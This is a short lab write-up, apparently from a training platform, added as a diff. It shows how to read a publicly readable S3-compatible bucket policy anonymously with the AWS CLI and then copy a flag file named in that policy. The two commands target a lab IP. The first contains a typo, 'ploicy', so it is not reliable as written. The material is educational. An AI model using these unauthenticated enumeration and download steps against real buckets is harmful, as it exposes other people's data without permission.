@@ -1,0 +1,39 @@
+
+
+
+we are given that any anonymous user can access that bucket policy.
+
+
+so use --no-sign-request with aws cli.
+
+ # aws --endpoint http://192.X.Y.3:9000 --no-sign-request s3api get-bucket-ploicy --bucket public
+
+output
+\{
+    "Policy": "{\"ID\":\"Policy1568185116930\",
+	\"Version\":\"2012-10-17\",\
+"Statement\":
+[{\"Sid\":\"Stmt1568184932403\"
+,\"Effect\":\"Allow\",
+\"Principal\":{\"AWS\":[\"*\"]},
+\"Action\":[\"s3:GetBucketPolicy\"],
+\"Resource\":[\"arn:aws:s3:::public\"]},
+{\"Sid\":\"Stmt1568185007451\",
+\"Effect\":\"Allow\",
+\"Principal\":{\"AWS\":[\"*\"]},
+\"Action\":[\"s3:GetObject\"],
+\"Resource\":[\"arn:aws:s3:::public/this-is-flag\"]}]}"
+}
+
+here I cannot list the objects with "list-object" parameter.
+
+First, I tried to update the policy of the bucket in order to list and get the objects.
+This is the drawback of not reading the instructions carefully.
+
+I cannot list but if I can download that.
+seeing the above policy - "public/this-is-flag"
+try to download or copy this to your attackdefense machine.
+
+
+# aws --endpoint http://192.X.Y.3:9000 --no-sign-request s3 cp s3://public/this-is-flag /root
+I was able to get the key using cat command.
